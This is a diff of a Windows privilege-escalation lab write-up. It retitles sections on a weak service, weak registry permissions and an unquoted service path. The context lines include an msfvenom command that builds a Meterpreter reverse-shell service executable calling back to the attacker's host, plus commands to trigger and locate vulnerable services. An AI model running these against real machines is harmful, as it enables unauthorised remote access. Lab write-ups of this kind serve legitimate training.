@@ -291,7 +291,7 @@ winPEAS was unable to locate this vuln in the scan I did. However, I manually se
 
 Task 4
 
-WeakSvc Exploit:
+### Exploit #1 WeakSvc Exploit
 #### On Kali - generate payload
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.199.129 LPORT=1341 -f exe-service > weak.exe
@@ -318,7 +318,7 @@ sc start WeakSvc
 ```
 https://youtu.be/L6jsYKpi2os
 
-Weak Registry Permissions - RegSvc Exploit:
+### Exploit #2 Weak Registry Permissions - RegSvc Exploit
 
 #### On Kali - generate payload
 
@@ -351,7 +351,8 @@ Trigger with reboot
 
 https://youtu.be/tZ9cMBuDX4s
 
-Unquoted Service Path - VulnSvc
+### Exploit #3 Unquoted Service Path - VulnSvc
+
 The next vuln I will exploit is the unquoted service path.
 First I want to find VulnSvc and its path ```Get-WmiObject win32_service | Where-Object {$_.Name -like "*VulnSvc*"} | Select Name, PathName, StartMode```
 
